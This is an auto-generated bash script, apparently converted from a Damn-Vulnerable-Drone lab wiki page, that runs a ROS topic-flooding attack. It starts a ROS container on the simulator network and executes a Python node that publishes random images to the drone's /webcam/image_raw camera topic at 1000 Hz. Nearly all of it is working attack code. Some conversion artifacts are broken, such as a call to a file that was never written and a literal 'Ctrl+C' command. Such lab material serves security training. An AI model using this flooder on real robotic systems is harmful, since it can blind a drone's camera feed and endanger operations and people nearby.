#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Camera-Feed-ROS-Topic-Flooding.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=camera-feed-ros-topic-flooding src=Camera-Feed-ROS-Topic-Flooding.md"
log "[BLOCK 1] type=shell"
sudo docker pull ros:noetic-ros-base

log "[BLOCK 2] type=shell"
docker run -it --network=simulator --ip=10.13.0.10 --name ros_noetic_container ros:noetic-ros-base bash

log "[BLOCK 3] type=shell"
export ROS_MASTER_URI=http://10.13.0.5:11311
export ROS_IP=10.13.0.10
source /opt/ros/noetic/setup.bash

log "[BLOCK 4] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
#!/usr/bin/env python3

import rospy
from sensor_msgs.msg import Image
import numpy as np

def flood_topic():
    rospy.init_node('image_flooder', anonymous=True)
    pub = rospy.Publisher('/webcam/image_raw', Image, queue_size=10)
    rate = rospy.Rate(1000)  # 1000 Hz flooding

    while not rospy.is_shutdown():
        img = Image()
        img.height = 480
        img.width = 640
        img.encoding = "rgb8"
        img.is_bigendian = 0
        img.step = img.width * 3
        img.data = np.random.bytes(img.step * img.height)
        pub.publish(img)
        rate.sleep()

if __name__ == '__main__':
    try:
        flood_topic()
    except rospy.ROSInterruptException:
        pass
PY

log "[BLOCK 5] type=shell"
python3 ros-topic-flood.py

log "[BLOCK 6] type=shell"
Ctrl+C

